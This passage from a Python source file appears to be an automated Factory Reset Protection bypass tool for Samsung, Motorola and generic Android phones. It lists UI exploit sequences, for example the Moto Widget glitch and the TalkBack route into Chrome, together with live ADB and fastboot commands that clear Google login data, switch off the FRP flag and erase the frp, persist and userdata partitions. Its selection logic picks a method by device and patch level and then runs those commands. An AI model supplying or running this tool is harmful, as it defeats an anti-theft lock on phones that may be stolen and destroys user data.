        - Handles both Google FRP and Samsung Account layer
        - Requires exact Samsung firmware files for the model
        - Uses Odin to flash combination firmware
        """
        return (
            ("Download combination firmware",
             "# MANUAL: Download exact combination FW for your model from samfrew.com"),
            ("Enter Download mode",
             "# MANUAL: Power off, hold Vol Down + Home + Power"),
            ("Open Odin as administrator",
             "# MANUAL: Run Odin3 as Administrator on Windows"),
            ("Load combination firmware",
             "# MANUAL: Click AP button, select combination FW file"),
            ("Flash combination firmware",
             "# MANUAL: Click Start, wait for flash to complete"),
            ("Device boots to engineering mode",
             "# WAIT: Device will boot to combination firmware"),
            ("Enable ADB in engineering settings",
             "# MANUAL: Go to Settings > Developer Options > Enable USB Debugging"),
            ("Run FRP removal commands via ADB",
             "# TOOL: Use ADB commands to clear FRP flags"),
            ("Flash stock firmware via Odin",
             "# MANUAL: Flash original stock firmware to restore normal operation"),
            ("Complete setup wizard",
             "# MANUAL: Device should now skip FRP/Samsung account lock"),
        )

    def samsung_browser_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Samsung browser-based FRP bypass (older devices only)."""
        return (
            ("Connect to WiFi",
             self._adb("shell am start -a android.settings.WIFI_SETTINGS")),
            ("Open Samsung Internet browser",
             self._adb("shell am start -a android.intent.action.VIEW -d http://www.google.com")),
            ("Navigate to FRP bypass APK site",
             "# MANUAL: Go to a site with FRP bypass APKs"),
            ("Download Google Account Manager APK",
             "# MANUAL: Download GAM.apk for your Android version"),
            ("Install Google Account Manager",
             self._adb("shell pm install /sdcard/Download/GAM.apk")),
            ("Download FRP Bypass APK",
             "# MANUAL: Download FRP_Bypass.apk"),
            ("Install FRP Bypass",
             self._adb("shell pm install /sdcard/Download/FRP_Bypass.apk")),
            ("Launch FRP Bypass app",
             self._adb("shell am start -n com.frp.bypass/.MainActivity")),
            ("Sign in with new Google account",
             "# MANUAL: Use the app to sign in with a known Google account"),
        )

    # ══════════════════════════════════════════════════════════════════════
    # MOTOROLA METHODS (2026 Updated)
    # ══════════════════════════════════════════════════════════════════════

    def motorola_hello_ui_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Motorola Hello UI (Android 14+) FRP bypass - Moto Widget exploit.

        This method exploits the Moto Widget to access Settings:
        1. Access Emergency Information
        2. Tap owner icon to open file picker
        3. Long-press Moto Widget to glitch interface
        4. Access Battery Usage to enter Settings
        5. Force stop Android Setup, disable Google Play Services
        6. Return to WiFi setup and complete setup wizard

        Note: Patched on some newer Moto G 2024+ models.
        """
        return (
            # Step 1: Access Emergency Information
            ("Tap Emergency Call",
             "# MANUAL: From welcome screen, tap Emergency Call"),
            ("Tap Emergency Information",
             "# MANUAL: Tap Emergency Information at top"),
            ("Tap Edit Pencil Icon",
             "# MANUAL: Tap pencil icon to edit"),
            
            # Step 2: Open file picker via owner icon
            ("Tap Name field",
             "# MANUAL: Tap the Name field"),
            ("Tap owner icon (ghost image)",
             "# MANUAL: Tap the owner icon to choose image"),
            
            # Step 3: Glitch interface with Moto Widget
            ("Tap hamburger menu",
             "# MANUAL: Tap three-line menu icon"),
            ("Long-press Moto Widget",
             "# MANUAL: Long-press Moto Widget icon and drag to center"),
            ("Watch for interface glitch",
             "# WAIT: Interface should glitch, drop the widget"),
            
            # Step 4: Access Settings via Battery Usage
            ("Navigate to App Info",
             "# MANUAL: You should see App Info screen"),
            ("Tap Battery",
             "# MANUAL: Tap Battery option"),
            ("Tap Battery Usage",
             "# MANUAL: Tap Battery Usage to enter Settings"),
            
            # Step 5: Disable security layers
            ("Go to Settings > Apps",
             "# MANUAL: Navigate to Apps in Settings"),
            ("Force Stop Android Setup",
             "# MANUAL: Find Android Setup, tap Force Stop"),
            ("Disable Google Play Services",
             "# MANUAL: Find Google Play Services, tap Disable"),
            
            # Step 6: Complete setup wizard
            ("Press back to WiFi setup",
             "# MANUAL: Press back until WiFi setup screen"),
            ("Proceed through setup",
             "# MANUAL: Tap Next, wait for 'Checking for updates' loop"),
            ("Re-enable Play Services quickly",
             "# MANUAL: Quickly re-enable Play Services when loop starts"),
            ("Complete setup",
             "# MANUAL: Setup should complete, FRP bypassed"),
        )

    def motorola_talkback_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Motorola MyUX (Android 13 and older) TalkBack method.

        Uses TalkBack accessibility feature to trigger Google Assistant:
        1. Enable TalkBack with volume keys
        2. Draw reverse L gesture for voice commands
        3. Say "Google Assistant" then "Open YouTube"
        4. Access Chrome via YouTube Terms of Service
        5. Download and install FRP bypass APK

        Note: Patched in Android 14+ security updates.
        """
        return (
            # Step 1: Enable TalkBack
            ("Hold Volume Up + Down for 3 seconds",
             "# MANUAL: Press and hold both volume buttons"),
            ("TalkBack should activate",
             "# WAIT: You should hear TalkBack announcement"),
            
            # Step 2: Voice command gesture
            ("Draw reverse L shape",
             "# MANUAL: Swipe right, then up (reverse L)"),
            ("Voice commands menu opens",
             "# WAIT: You should see voice command prompt"),
            
            # Step 3: Open Assistant
            ("Say 'Google Assistant'",
             "# MANUAL: Speak clearly: Google Assistant"),
            ("Assistant should open",
             "# WAIT: Google Assistant interface appears"),
            
            # Step 4: Open YouTube
            ("Say 'Open YouTube'",
             "# MANUAL: Speak clearly: Open YouTube"),
            ("YouTube should open",
             "# WAIT: YouTube app launches"),
            
            # Step 5: Access Chrome
            ("Tap profile icon",
             "# MANUAL: Tap your profile icon in YouTube"),
            ("Tap Settings",
             "# MANUAL: Tap Settings option"),
            ("Tap About",
             "# MANUAL: Tap About section"),
            ("Tap YouTube Terms of Service",
             "# MANUAL: This opens Chrome browser"),
            
            # Step 6: Download FRP bypass
            ("Navigate to FRP bypass site",
             "# MANUAL: Go to riserom.com or similar FRP site"),
            ("Download FRP bypass APK",
             "# MANUAL: Download the appropriate APK for your Android version"),
            ("Install the APK",
             "# MANUAL: Allow unknown sources, install APK"),
            
            # Step 7: Add Google account
            ("Open installed FRP app",
             "# MANUAL: Launch the FRP bypass app"),
            ("Add new Google account",
             "# MANUAL: Sign in with a known Google account"),
            ("Reboot device",
             self._adb("reboot")),
        )

    def motorola_emergency_dialer_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Motorola Emergency Dialer method.

        Uses secret dialer codes to access hidden menus:
        - *#*#4636#*#* (Testing menu)
        - *#*#526#*#* (Engineering mode on some models)

        Works on: Android 10-12, some Android 13 devices
        Patched on: Newer Moto G 2024+ models
        """
        return (
            # Step 1: Connect to WiFi
            ("Connect to WiFi",
             self._adb("shell am start -a android.settings.WIFI_SETTINGS")),
            
            # Step 2: Open emergency dialer
            ("Tap Emergency Call",
             "# MANUAL: From setup screen, tap Emergency Call"),
            
            # Step 3: Dial secret code
            ("Dial *#*#4636#*#*",
             "# MANUAL: Type *#*#4636#*#* on dialpad"),
            ("Alternative: Dial *#*#526#*#*",
             "# MANUAL: If first code fails, try *#*#526#*#*"),
            
            # Step 4: Access Testing menu
            ("Navigate to Usage Statistics",
             "# MANUAL: Tap Usage Statistics in Testing menu"),
            ("Tap back arrow",
             "# MANUAL: Tap back - this should open Settings"),
            
            # Step 5: Access Settings
            ("Go to Accounts",
             "# MANUAL: Navigate to Settings > Accounts"),
            ("Add Google account",
             "# MANUAL: Tap Add account > Google"),
            ("Sign in with known account",
             "# MANUAL: Enter credentials for a Google account you know"),
            
            # Step 6: Reboot
            ("Reboot device",
             self._adb("reboot")),
        )

    def motorola_fastboot_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Motorola Fastboot FRP erase method.

        Works on both MediaTek and Qualcomm Motorola devices:
        - MediaTek: Use MTK Client for Brom mode (free)
        - Qualcomm: Use fastboot commands or EDL mode (may need tools)
        """
        return (
            # Step 1: Enter Fastboot mode
            ("Enter Fastboot mode",
             "# MANUAL: Power off, hold Volume Down + Power"),
            ("Connect to PC via USB",
             "# MANUAL: Connect USB cable while in Fastboot"),
            
            # Step 2: Verify fastboot connection
            ("Verify fastboot connection",
             self._fastboot("devices")),
            
            # Step 3: Erase FRP partition
            ("Erase FRP partition",
             self._fastboot("erase frp")),
            
            # Step 4: Erase persist (alternative)
            ("Erase persist partition",
             self._fastboot("erase persist")),
            
            # Step 5: Erase userdata
            ("Erase userdata partition",
             self._fastboot("erase userdata")),
            
            # Step 6: Reboot
            ("Reboot device",
             self._fastboot("reboot")),
        )

    def motorola_setup_wizard_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Motorola Setup Wizard bypass method.

        Works on Android 12-14 by exploiting setup wizard flow.
        """
        return (
            # Step 1: Start setup
            ("Begin device setup",
             "# MANUAL: Start through initial setup wizard"),
            
            # Step 2: Connect to WiFi
            ("Connect to WiFi",
             "# MANUAL: Connect to any WiFi network"),
            
            # Step 3: Wait for updates check
            ("Wait at 'Checking for updates'",
             "# WAIT: Let the phone sit at this screen"),
            
            # Step 4: Trigger accessibility
            ("Press Volume Up + Down together",
             "# MANUAL: This may trigger accessibility shortcut"),
            
            # Step 5: Access Settings
            ("Navigate through accessibility to Settings",
             "# MANUAL: Use accessibility menu to reach Settings"),
            
            # Step 6: Disable setup
            ("Force Stop Android Setup",
             "# MANUAL: Settings > Apps > Android Setup > Force Stop"),
            ("Disable Google Play Services",
             "# MANUAL: Settings > Apps > Google Play Services > Disable"),
            
            # Step 7: Complete setup
            ("Go back and complete setup",
             "# MANUAL: Return to setup, it should skip FRP check"),
        )

    def motorola_motoreaper_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Motorola MotoReaper PC tool workflow.

        Most reliable method for newer Motorola devices (Android 13+).
        Free tool specifically built for Motorola FRP bypass.
        """
        return (
            # Step 1: Install Motorola drivers
            ("Install Motorola USB drivers",
             "# MANUAL: Download and install Motorola drivers on PC"),
            
            # Step 2: Download MotoReaper
            ("Download MotoReaper tool",
             "# MANUAL: Get MotoReaper from official source"),
            
            # Step 3: Enter Fastboot mode
            ("Enter Fastboot mode",
             "# MANUAL: Power off, hold Volume Down + Power"),
            
            # Step 4: Connect to PC
            ("Connect phone via USB",
             "# MANUAL: Connect while in Fastboot mode"),
            
            # Step 5: Run MotoReaper
            ("Open MotoReaper as administrator",
             "# MANUAL: Right-click > Run as Administrator"),
            ("Select device and click Bypass",
             "# MANUAL: Tool will push files automatically (2-5 minutes)"),
            
            # Step 6: Wait for completion
            ("Wait for device to reboot",
             "# WAIT: Device will reboot automatically when done"),
            
            # Step 7: Complete setup
            ("Complete setup wizard",
             "# MANUAL: FRP screen should be gone"),
        )

    # ══════════════════════════════════════════════════════════════════════
    # GENERIC ANDROID METHODS
    # ══════════════════════════════════════════════════════════════════════

    def adb_account_remove_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Generic ADB-based FRP bypass (non-Samsung/Motorola devices)."""
        return (
            ("Verify ADB access",
             self._adb("shell echo test")),
            ("Set user setup complete flag",
             self._adb("shell content insert --uri content://settings/secure "
                       "--bind name:s:user_setup_complete --bind value:s:1")),
            ("Clear account manager",
             self._adb("shell pm clear com.google.android.gsf.login")),
            ("Launch Google login activity",
             self._adb("shell am start -n com.google.android.gsf.login/")),
            ("Clear Google Play Services",
             self._adb("shell pm clear com.google.android.gms")),
            ("Remove FRP flag",
             self._adb("shell settings put secure frp_lock_enabled 0")),
            ("Reboot device",
             self._adb("reboot")),
        )

    def fastboot_erase_steps(self) -> Tuple[Tuple[str, str], ...]:
        """Generic Fastboot FRP erase method."""
        return (
            ("Check fastboot mode",
             self._fastboot("devices")),
            ("Erase FRP partition",
             self._fastboot("erase frp")),
            ("Erase persist partition",
             self._fastboot("erase persist")),
            ("Erase userdata partition",
             self._fastboot("erase userdata")),
            ("Reboot device",
             self._fastboot("reboot")),
        )

    def sideload_bypass_steps(self) -> Tuple[Tuple[str, str], ...]:
        """ADB sideload bypass using recovery mode."""
        return (
            ("Reboot to recovery",
             self._adb("reboot recovery")),
            ("Select ADB sideload",
             "# MANUAL: In recovery, select Apply update from ADB"),
            ("Sideload bypass package",
             self._adb("sideload frp_bypass.zip")),
            ("Reboot to system",
             self._adb("reboot")),
        )

    # ══════════════════════════════════════════════════════════════════════
    # METHOD SELECTION & EXECUTION
    # ══════════════════════════════════════════════════════════════════════

    def get_recommended_method(self) -> FRPMethod:
        """Determine the best FRP bypass method based on device state."""
        info = self.get_device_info()

        # Fastboot mode - use fastboot method
        if info["in_fastboot"]:
            if info["is_motorola"]:
                return FRPMethod.MOTO_FASTBOOT_ERASE
            return FRPMethod.FASTBOOT_ERASE

        # Samsung device
        if info["is_samsung"]:
            if info["has_adb"]:
                return FRPMethod.SAMSUNG_ADB_REMOVE
            
            # Check patch level for method compatibility
            if self.is_samsung_test_mode_compatible():
                return FRPMethod.SAMSUNG_TEST_MODE
            elif self.is_samsung_mtp_compatible():
                return FRPMethod.SAMSUNG_MTP_HALABTECH
            else:
                # Jan 2026+ patch - need combination FW or professional tools
                return FRPMethod.SAMSUNG_COMBINATION_FW

        # Motorola device
        if info["is_motorola"]:
            if info["has_adb"]:
                return FRPMethod.ADB_ACCOUNT_REMOVE
            
            ui = info.get("motorola_ui")
            android_version = info.get("android_version", "")
            
            # Check Android version for method selection
            try:
                major = int(android_version.split(".")[0]) if android_version else 0
            except ValueError:
                major = 0
            
            if ui == "hello_ui":
                return FRPMethod.MOTO_HELLO_UI
            elif ui == "myux":
                return FRPMethod.MOTO_TALKBACK
            
            # Default for unknown UI
            return FRPMethod.MOTO_EMERGENCY_DIALER

        # Generic Android with ADB
        if info["has_adb"]:
            return FRPMethod.ADB_ACCOUNT_REMOVE

        # Default
        return FRPMethod.SAMSUNG_BROWSER

    def get_compatible_methods(self) -> List[FRPMethod]:
        """Return all methods compatible with the current device."""
        info = self.get_device_info()
        methods = []

        if info["in_fastboot"]:
            if info["is_motorola"]:
                methods.append(FRPMethod.MOTO_FASTBOOT_ERASE)
            methods.append(FRPMethod.FASTBOOT_ERASE)
            return methods

        if info["is_samsung"]:
            if info["has_adb"]:
                methods.append(FRPMethod.SAMSUNG_ADB_REMOVE)
            
            if self.is_samsung_test_mode_compatible():
                methods.append(FRPMethod.SAMSUNG_TEST_MODE)
            
            if self.is_samsung_mtp_compatible():
                methods.append(FRPMethod.SAMSUNG_MTP_HALABTECH)
            
            methods.append(FRPMethod.SAMSUNG_COMBINATION_FW)
            methods.append(FRPMethod.SAMSUNG_BROWSER)
            methods.append(FRPMethod.SAMSUNG_DOWNLOAD_MODE)

        elif info["is_motorola"]:
            if info["has_adb"]:
                methods.append(FRPMethod.ADB_ACCOUNT_REMOVE)
            
            ui = info.get("motorola_ui")
            if ui == "hello_ui":
                methods.append(FRPMethod.MOTO_HELLO_UI)
                methods.append(FRPMethod.MOTO_EMERGENCY_DIALER)
            elif ui == "myux":
                methods.append(FRPMethod.MOTO_TALKBACK)
                methods.append(FRPMethod.MOTO_EMERGENCY_DIALER)
            else:
                methods.append(FRPMethod.MOTO_EMERGENCY_DIALER)
                methods.append(FRPMethod.MOTO_TALKBACK)
                methods.append(FRPMethod.MOTO_HELLO_UI)
            
            methods.append(FRPMethod.MOTO_FASTBOOT_ERASE)
            methods.append(FRPMethod.MOTO_SETUP_WIZARD)
            methods.append(FRPMethod.MOTO_MOTOREAPER)

        else:
            if info["has_adb"]:
                methods.append(FRPMethod.ADB_ACCOUNT_REMOVE)
            methods.append(FRPMethod.SIDELOAD_BYPASS)
            methods.append(FRPMethod.FASTBOOT_ERASE)

        return methods

    def get_compatibility_notes(self) -> List[str]:
        """Return compatibility notes based on device state."""
        info = self.get_device_info()
        notes = []

        if info["is_samsung"]:
            if info.get("is_jan_2026_or_later"):
                notes.append(
                    "CRITICAL: Device has Jan 2026+ security patch. "
                    "Most DIY methods are blocked. Use Combination Firmware flash "
                    "or downgrade firmware via Odin to Dec 2025 or earlier."
                )
            elif info.get("is_dec_2025_or_earlier"):
                notes.append(
                    "Device has Dec 2025 or earlier patch. "
                    "Test Mode and MTP methods should work."
                )
            
            # Check for Samsung Account layer
            notes.append(
                "NOTE: Samsung devices have an additional Samsung Account layer "
                "below Android FRP. Even after Google FRP is bypassed, you may "
                "need Samsung Account credentials."
            )

        elif info["is_motorola"]:
            android_version = info.get("android_version", "")
            try:
                major = int(android_version.split(".")[0]) if android_version else 0
            except ValueError:
                major = 0
            
            if major >= 14:
                notes.append(
                    "Android 14+: TalkBack method is patched. "
                    "Use Hello UI Widget exploit or MotoReaper PC tool."
                )
            elif major >= 12:
                notes.append(
                    "Android 12-13: TalkBack and Emergency Dialer methods "
                    "may still work on older patches."
                )
            
            if info.get("is_jan_2026_or_later"):
                notes.append(
                    "WARNING: Jan 2026+ patch may block some no-PC methods. "
                    "MotoReaper or firmware flash recommended."
                )

        else:
            notes.append(
                "Generic Android device detected. "
                "ADB or Fastboot methods recommended."
            )

        return notes

    def execute_bypass(
        self,
        method: Optional[FRPMethod] = None,
        auto_reboot: bool = True,
    ) -> FRPResult:
        """Execute FRP bypass using specified or recommended method."""
        if method is None:
            method = self.get_recommended_method()

        step_methods = {
            # Samsung
            FRPMethod.SAMSUNG_TEST_MODE: self.samsung_test_mode_steps,
            FRPMethod.SAMSUNG_MTP_HALABTECH: self.samsung_mtp_halabtech_steps,
            FRPMethod.SAMSUNG_ADB_REMOVE: self.samsung_adb_remove_steps,
            FRPMethod.SAMSUNG_DOWNLOAD_MODE: self.samsung_download_mode_steps,
            FRPMethod.SAMSUNG_COMBINATION_FW: self.samsung_combination_fw_steps,
            FRPMethod.SAMSUNG_BROWSER: self.samsung_browser_steps,
            # Motorola
            FRPMethod.MOTO_HELLO_UI: self.motorola_hello_ui_steps,
            FRPMethod.MOTO_TALKBACK: self.motorola_talkback_steps,
            FRPMethod.MOTO_EMERGENCY_DIALER: self.motorola_emergency_dialer_steps,
            FRPMethod.MOTO_FASTBOOT_ERASE: self.motorola_fastboot_steps,
            FRPMethod.MOTO_SETUP_WIZARD: self.motorola_setup_wizard_steps,
            FRPMethod.MOTO_MOTOREAPER: self.motorola_motoreaper_steps,
            # Generic
            FRPMethod.ADB_ACCOUNT_REMOVE: self.adb_account_remove_steps,
            FRPMethod.FASTBOOT_ERASE: self.fastboot_erase_steps,
            FRPMethod.SIDELOAD_BYPASS: self.sideload_bypass_steps,
        }

        steps = step_methods.get(method, self.adb_account_remove_steps)()
        device_info = self.get_device_info()
        
        # Check USB connection first
        if not device_info["usb_connected"]:
            return FRPResult(
                success=False,
                method=method,
                message="FAILED: No device connected via USB.",
                steps_completed=0,
                total_steps=len(steps),
                device_info=device_info,
            )

        total = len(steps)
        completed = 0
        last_error = ""
        actual_commands_run = 0
        manual_steps_done = False

        for desc, cmd in steps:
            # Manual steps - don't count as complete, just skip
            if cmd.startswith("#"):
                if cmd.startswith("# WAIT"):
                    time.sleep(2)
                # Don't increment completed for manual steps
                continue
            
            # First real command - check prerequisites here
            if not manual_steps_done:
                manual_steps_done = True
                # Re-check device state after manual steps
                self._device_cache = {}
                current_info = self.get_device_info()
                
                requires_adb = method in (
                    FRPMethod.SAMSUNG_ADB_REMOVE,
                    FRPMethod.ADB_ACCOUNT_REMOVE,
                )
                requires_fastboot = method in (
                    FRPMethod.FASTBOOT_ERASE,
                    FRPMethod.MOTO_FASTBOOT_ERASE,
                )
                
                if requires_adb and not current_info["has_adb"]:
                    return FRPResult(
                        success=False,
                        method=method,
                        message=f"FAILED: {method.value} requires ADB but device has no ADB access. "
                                f"Phone must have USB debugging enabled.",
                        steps_completed=0,
                        total_steps=actual_commands_run,
                        device_info=device_info,
                    )
                
                if requires_fastboot and not current_info["in_fastboot"]:
                    return FRPResult(
                        success=False,
                        method=method,
                        message=f"FAILED: {method.value} requires fastboot mode but device is not in fastboot. "
                                f"Power off phone, hold Volume Down + Power to enter fastboot.",
                        steps_completed=0,
                        total_steps=actual_commands_run,
                        device_info=device_info,
                    )

            # Actual command - execute and verify
            out, err, code = self._run_cmd(cmd)
            actual_commands_run += 1
            
            if code == 0:
                completed += 1
            else:
                last_error = err or out or f"exit code {code}"
                # Don't fail on non-critical errors
                if "already" in (err or "").lower() or "exists" in (err or "").lower():
                    completed += 1
                    continue
                # Critical error - stop execution
                break

        # Success only if ALL actual commands succeeded
        # Manual steps don't count toward success
        success = actual_commands_run > 0 and completed == actual_commands_run
        
        # Verify final state
        if success:
            # Re-check device state after bypass
            self._device_cache = {}
            new_info = self.get_device_info()
            
            requires_adb = method in (
                FRPMethod.SAMSUNG_ADB_REMOVE,
                FRPMethod.ADB_ACCOUNT_REMOVE,
            )
            requires_fastboot = method in (
                FRPMethod.FASTBOOT_ERASE,
                FRPMethod.MOTO_FASTBOOT_ERASE,
            )
            
            # If method required ADB, verify ADB still works
            if requires_adb and not new_info["has_adb"]:
                success = False
                last_error = "ADB connection lost after bypass"
            
            # If method required fastboot, verify fastboot still works
            if requires_fastboot and not new_info["in_fastboot"]:
                # Fastboot might have rebooted - that's OK
                pass

        requires_reboot = method in (
            FRPMethod.FASTBOOT_ERASE,
            FRPMethod.MOTO_FASTBOOT_ERASE,
            FRPMethod.SIDELOAD_BYPASS,
            FRPMethod.SAMSUNG_TEST_MODE,
            FRPMethod.SAMSUNG_MTP_HALABTECH,
            FRPMethod.SAMSUNG_ADB_REMOVE,
            FRPMethod.ADB_ACCOUNT_REMOVE,
            FRPMethod.MOTO_TALKBACK,
            FRPMethod.MOTO_EMERGENCY_DIALER,
        )

        if success:
            msg = f"FRP bypass completed via {method.value}"
            if requires_reboot and auto_reboot:
                msg += ". Device will reboot."
        else:
            if actual_commands_run == 0:
                msg = f"FAILED: No actual commands executed. Method {method.value} requires manual steps on device."
            else:
                msg = f"FRP bypass failed at step {completed}/{actual_commands_run}: {last_error}"

        return FRPResult(
            success=success,
            method=method,
            message=msg,
            requires_reboot=requires_reboot,
            steps_completed=completed,
            total_steps=actual_commands_run,
            device_info=device_info,
        )
